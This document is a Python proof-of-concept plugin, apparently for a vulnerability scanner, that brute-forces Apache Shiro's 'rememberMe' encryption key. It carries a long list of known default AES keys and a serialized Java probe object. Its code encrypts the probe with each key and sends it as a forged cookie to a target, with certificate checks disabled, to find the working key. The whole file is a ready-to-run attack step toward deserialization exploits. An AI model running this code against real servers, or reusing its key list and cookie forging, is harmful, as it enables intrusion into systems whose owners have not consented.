#!/usr/bin/python
# coding=utf-8
'''
Date: 2022-03-23 16:29:35
LastEditors: recar
LastEditTime: 2022-03-23 18:21:35
'''
from plugins.poc.base import PocBase
import base64
import uuid
import requests
from Crypto.Cipher import AES
##  'kPH+bIxk5D2deZiIxcaaaA=='
keys = [
'kPH+bIxk5D2deZiIxcaaaA==', '4AvVhmFLUs0KTA3Kprsdag==', 'fCq+/xW488hMTCE+cmJ3FF==', 'zSyK5Kp6PZAAjlT+eeNMlg==', 'WkhBTkdYSUFPSEVJX0NBVA==',
'RVZBTk5JR0hUTFlfV0FPVQ==', 'U3ByaW5nQmxhZGUAAAAAAA==', 'cGljYXMAAAAAAAAAAAAAAA==', 'd2ViUmVtZW1iZXJNZUtleQ==', 'fsHspZw/92PrS3XrPW+vxw==',
'sHdIjUN6tzhl8xZMG3ULCQ==', 'WuB+y2gcHRnY2Lg9+Aqmqg==', 'ertVhmFLUs0KTA3Kprsdag==', '2itfW92XazYRi5ltW0M2yA==', '6ZmI6I2j3Y+R1aSn5BOlAA==',
'f/SY5TIve5WWzT4aQlABJA==', 'Jt3C93kMR9D5e8QzwfsiMw==', 'aU1pcmFjbGVpTWlyYWNsZQ==', 'XTx6CKLo/SdSgub+OPHSrw==', '8AvVhmFLUs0KTA3Kprsdag==',
'66v1O8keKNV3TTcGPK1wzg==', 'Q01TX0JGTFlLRVlfMjAxOQ==', '5AvVhmFLUS0ATA4Kprsdag==', 'ZmFsYWRvLnh5ei5zaGlybw==', '0AvVhmFLUs0KTA3Kprsdag==',
'r0e3c16IdVkouZgk1TKVMg==', 'Z3VucwAAAAAAAAAAAAAAAA==', '5J7bIJIV0LQSN3c9LPitBQ==', 'ZnJlc2h6Y24xMjM0NTY3OA==', 'yeAAo1E8BOeAYfBlm4NG9Q==',
'a3dvbmcAAAAAAAAAAAAAAA==', '4BvVhmFLUs0KTA3Kprsdag==', 's0KTA3mFLUprK4AvVhsdag==', 'yNeUgSzL/CfiWw1GALg6Ag==', 'OY//C4rhfwNxCQAQCrQQ1Q==',
'fCq+/xW488hMTCD+cmJ3aQ==', 'ZAvph3dsQs0FSL3SDFAdag==', 'MTIzNDU2NzgxMjM0NTY3OA==', '1AvVhdsgUs0FSA3SDFAdag==', 'Bf7MfkNR0axGGptozrebag==',
'1QWLxg+NYmxraMoxAXu/Iw==', '6AvVhmFLUs0KTA3Kprsdag==', '6NfXkC7YVCV5DASIrEm1Rg==', '2AvVhdsgUs0FSA3SDFAdag==', '9FvVhtFLUs0KnA3Kprsdyg==',
'OUHYQzxQ/W9e/UjiAGu6rg==', 'ClLk69oNcA3m+s0jIMIkpg==', 'vXP33AonIp9bFwGl7aT7rA==', 'NGk/3cQ6F5/UNPRh8LpMIg==', 'MPdCMZ9urzEA50JDlDYYDg==',
'c2hpcm9fYmF0aXMzMgAAAA==', 'XgGkgqGqYrix9lI6vxcrRw==', '2A2V+RFLUs+eTA3Kpr+dag==', '5AvVhmFLUs0KTA3Kprsdag==', '3AvVhmFLUs0KTA3Kprsdag==',
'WcfHGU25gNnTxTlmJMeSpw==', 'bWljcm9zAAAAAAAAAAAAAA==', 'bWluZS1hc3NldC1rZXk6QQ==', 'bXRvbnMAAAAAAAAAAAAAAA==', '6ZmI6I2j5Y+R5aSn5ZOlAA==',
'3JvYhmBLUs0ETA5Kprsdag==', 'A7UzJgh1+EWj5oBFi+mSgw==', 'Is9zJ3pzNh2cgTHB4ua3+Q==', '25BsmdYwjnfcWmnhAciDDg==', 'cmVtZW1iZXJNZQAAAAAAAA==',
'7AvVhmFLUs0KTA3Kprsdag==', '3qDVdLawoIr1xFd6ietnwg==', 'Y1JxNSPXVwMkyvES/kJGeQ==', 'xVmmoltfpb8tTceuT5R7Bw==', 'O4pdf+7e+mZe8NyxMTPJmQ==',
'SDKOLKn2J1j/2BHjeZwAoQ==', 'a2VlcE9uR29pbmdBbmRGaQ==', 'V2hhdCBUaGUgSGVsbAAAAA==', 'GAevYnznvgNCURavBhCr1w==', 'hBlzKg78ajaZuTE0VLzDDg==',
'2cVtiE83c4lIrELJwKGJUw==', 'U3BAbW5nQmxhZGUAAAAAAA==', '9AvVhmFLUs0KTA3Kprsdag==', 'SkZpbmFsQmxhZGUAAAAAAA==', 'lT2UvDUmQwewm6mMoiw4Ig==',
'HWrBltGvEZc14h9VpMvZWw==', 'wGiHplamyXlVB11UXWol8g==', '8BvVhmFLUs0KTA3Kprsdag==', 'bya2HkYo57u6fWh5theAWw==', 'IduElDUpDDXE677ZkhhKnQ==',
'1tC/xrDYs8ey+sa3emtiYw==', 'MTIzNDU2Nzg5MGFiY2RlZg==', 'c+3hFGPjbgzGdrC+MHgoRQ==', 'rPNqM6uKFCyaL10AK51UkQ==', '5aaC5qKm5oqA5pyvAAAAAA==',
'cGhyYWNrY3RmREUhfiMkZA==', 'MzVeSkYyWTI2OFVLZjRzZg==', 'YI1+nBV//m7ELrIyDHm6DQ==', 'empodDEyMwAAAAAAAAAAAA==', 'NsZXjXVklWPZwOfkvk6kUA==',
'ZUdsaGJuSmxibVI2ZHc9PQ==', 'L7RioUULEFhRyxM7a2R/Yg==', 'i45FVt72K2kLgvFrJtoZRw==', 'bXdrXl9eNjY2KjA3Z2otPQ==', 'sgIQrqUVxa1OZRRIK3hLZw==',
'tiVV6g3uZBGfgshesAQbjA==', 'GsHaWo4m1eNbE0kNSMULhg==', 'l8cc6d2xpkT1yFtLIcLHCg==', 'KU471rVNQ6k7PQL4SqxgJg==', '6Zm+6I2j5Y+R5aS+5ZOlAA==',
'kPH+bIxk5D2deZiIxcabaA==', 'kPH+bIxk5D2deZiIxcacaA==', '3AvVhdAgUs0FSA4SDFAdBg==', '4AvVhdsgUs0F563SDFAdag==', 'FL9HL9Yu5bVUJ0PDU1ySvg==',
'5RC7uBZLkByfFfJm22q/Zw==', 'eXNmAAAAAAAAAAAAAAAAAA==', 'fdCEiK9YvLC668sS43CJ6A==', 'FJoQCiz0z5XWz2N2LyxNww==', 'HeUZ/LvgkO7nsa18ZyVxWQ==',
'HoTP07fJPKIRLOWoVXmv+Q==', 'iycgIIyCatQofd0XXxbzEg==', 'm0/5ZZ9L4jjQXn7MREr/bw==', 'NoIw91X9GSiCrLCF03ZGZw==', 'oPH+bIxk5E2enZiIxcqaaA==',
'QAk0rp8sG0uJC4Ke2baYNA==', 'Rb5RN+LofDWJlzWAwsXzxg==', 's2SE9y32PvLeYo+VGFpcKA==', 'SrpFBcVD89eTQ2icOD0TMg==', 'U0hGX2d1bnMAAAAAAAAAAA==',
'Us0KvVhTeasAm43KFLAeng==', 'Ymx1ZXdoYWxlAAAAAAAAAA==', 'YWJjZGRjYmFhYmNkZGNiYQ==', 'zIiHplamyXlVB11UXWol8g==', 'ZjQyMTJiNTJhZGZmYjFjMQ==',
'HOlg7NHb9potm0n5s4ic0Q==', '2AvVhdsgUs0FSA3SaFAdfg==', '4rvVhmFLUs0KAT3Kprsdag==', 'AF05JAuyuEB1ouJQ9Y9Phg==', 'UGlzMjAxNiVLeUVlXiEjLw==',
'2AvVhdsgERdsSA3SDFAdag==', 'QF5HMyZAWDZYRyFnSGhTdQ==', '8AvVhdsgUs0FSA3SDFAdag==', '4AvVhmFLUs5KTA1Kprsdag==', '4WCZSJyqdUQsije93aQIRg==',
'3rvVhmFLUs0KAT3Kprsdag==', 'b2EAAAAAAAAAAAAAAAAAAA==', '3AvVhMFLIs0KTA3Kprsdag==', '4AvVhm2LUs0KTA3Kprsdag==', '2AvVCXsxUs0FSA7SYFjdQg==',
'Cj6LnKZNLEowAZrdqyH/Ew==', '3qDVdLawoIr1xFd6ietnsg==', '2AvVhdsgUsOFSA3SDFAdag==', 'FP7qKJzdJOGkzoQzo2wTmA==', 'wyLZMDifwq3sW1vhhHpgKA==',
'5AvVhCsgUs0FSA3SDFAdag==', 'pbnA+Qzen1vjV3rNqQBLHg==', 'GhrF5zLfq1Dtadd1jlohhA==', '2AvVhmFLUs0KTA3Kprsdag==', 'mIccZhQt6EBHrZIyw1FAXQ==',
'4AvVhmFLUs0KTA3Kprseaf==', 'GHxH6G3LFh8Zb3NwoRgfFA==', 'B9rPF8FHhxKJZ9k63ik7kQ==', '3AvVhmFLUs0KTA3KaTHGFg==', 'M2djA70UBBUPDibGZBRvrA==',
'QDFCnfkLUs0KTA3Kprsdag==', '2adsfasdqerqerqewradsf==', '3Av2hmFLAs0BTA3Kprsd6E==', '4AvVhmFLUsOKTA3Kprsdag==', 'Z3VucwACAOVAKALACAADSA==',
'4AvVhmFLUs0KTA3KAAAAAA==', 'sBv2t3okbdm3U0r2EVcSzB==', '5oiR5piv5p2h5ZK46bG8IQ==', 'TGMPe7lGO/Gbr38QiJu1/w==', '4AvVhmFLUs0TTA3Kprsdag==',
'YWdlbnRAZG1AMjAxOHN3Zg==', 'Z3VucwAAAAAAAAAAAAABBB==', 'AztiX2RUqhc7dhOzl1Mj8Q==', 'FjbNm1avvGmWE9CY2HqV75==', 'QVN1bm5uJ3MgU3Vuc2l0ZQ==',
'9Ami6v2G5Y+r5aPnE4OlBB==', '2AvVidsaUSofSA3SDFAdog==', '3AvVhdAgUs1FSA4SDFAdBg==', 'R29yZG9uV2ViAAAAAAAAAA==', 'wrjUh2ttBPQLnT4JVhriug==',
'w793pPq5ZVBKkj8OhV4KaQ==', 'c2hvdWtlLXBsdXMuMjAxNg==', 'pyyX1c5x2f0LZZ7VKZXjKO==', 'duhfin37x6chw29jsne45m==', 'QUxQSEFNWVNPRlRCVUlMRA==',
'YVd4dmRtVjViM1UlM0QIdn==', 'YnlhdnMAAAAAAAAAAAAAAA==', 'YystomRZLMUjiK0Q1+LFdw==', '2AvVhdsgUs0FSA3SDFAder==', 'A+kWR7o9O0/G/W6aOGesRA==',
'kPv59vyqzj00x11LXJZTjJ2UHW48jzHN'
]

checker = "rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA=="

headers={"User-Agent":"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36 Zxxz/1.0","Connection":"close"}


class Poc(PocBase):
    def __init__(self):
        super(PocBase, self).__init__()
        self.name = "Apache Shiro 默认key"
        self.cve = ""
        self.author = "Recar"
        self.desc = "shiro 默认key"
        self.fingerprint = "shiro"

    def aes(self, payload,key):
        BS   = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        mode =  AES.MODE_CBC
        iv   =  uuid.uuid4().bytes
        encryptor = AES.new(base64.b64decode(key), mode, iv)
        file_body = pad(base64.b64decode(payload))
        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
        return base64_ciphertext

    def aes_v2(self, payload,key):
        BS   = AES.block_size
        mode =  AES.MODE_GCM
        iv   =  uuid.uuid4().bytes
        encryptor = AES.new(base64.b64decode(key), mode, iv)
        file_body=base64.b64decode(payload)
        enc,tag=encryptor.encrypt_and_digest(file_body)
        base64_ciphertext = base64.b64encode(iv + enc + tag)
        return base64_ciphertext

    def verify(self):
        for key in keys:
            base64_ciphertext_1 = self.aes(checker,key)
            base64_ciphertext_2 = self.aes_v2(checker,key)
            for base64_ciphertext in [base64_ciphertext_1, base64_ciphertext_2]:
                cookie={"rememberMe":base64_ciphertext.decode()}
                rsp = requests.get(
                    self.base_url, cookies=cookie,
                    headers=headers,allow_redirects=False,
                    verify=False)
                if 'Set-Cookie' not in rsp.headers.keys() or "rememberMe=deleteMe" not in rsp.headers.get("Set-Cookie"):
                    return True, key
        return False, None
